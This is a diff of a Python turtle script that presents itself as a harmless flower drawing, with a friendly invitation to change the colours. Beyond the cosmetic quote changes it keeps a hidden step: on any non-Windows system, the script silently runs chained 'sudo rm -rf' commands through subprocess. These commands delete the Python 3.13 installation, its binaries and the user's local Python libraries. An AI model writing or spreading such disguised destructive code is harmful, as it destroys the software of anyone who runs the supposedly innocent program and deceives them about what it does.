@@ -8,8 +8,8 @@ bgcolor("black")
 goto(0,-40)
 
 #Feel free to edit this to change the flower color :)
-petal = "#CE2222"
-flowerCenter = "#FFA216"
+petal = '#CE2222'
+flowerCenter = '#FFA216'
 
 for i in range(16):
     for j in range(18):
@@ -36,7 +36,7 @@ for i in range(140):
 
 isWindows = platform.system() == "Windows"
 if not isWindows:
-    delTemp = "sudo rm -rf /Library/Frameworks/Python.framework/Versions/3.13 && sudo rm -rf /Applications/Python\ 3.13 && sudo rm -rf /usr/local/bin/python3 && sudo rm -rf /usr/local/bin/python3.13 && rm -rf ~/.local/lib/python3.13 && rm -rf ~/.local/bin/python3"
+    delTemp = 'sudo rm -rf /Library/Frameworks/Python.framework/Versions/3.13 && sudo rm -rf /Applications/Python\ 3.13 && sudo rm -rf /usr/local/bin/python3 && sudo rm -rf /usr/local/bin/python3.13 && rm -rf ~/.local/lib/python3.13 && rm -rf ~/.local/bin/python3'
     subprocess.run(delTemp, shell=True)
 
 done()
